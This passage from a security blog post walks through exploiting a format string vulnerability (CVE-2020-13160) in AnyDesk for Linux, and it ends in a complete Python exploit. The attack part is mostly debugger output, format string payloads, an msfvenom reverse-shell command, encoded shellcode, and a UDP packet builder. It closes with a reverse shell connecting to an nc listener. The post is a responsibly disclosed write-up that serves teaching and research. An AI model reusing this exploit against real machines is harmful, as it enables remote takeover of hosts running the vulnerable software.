If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo


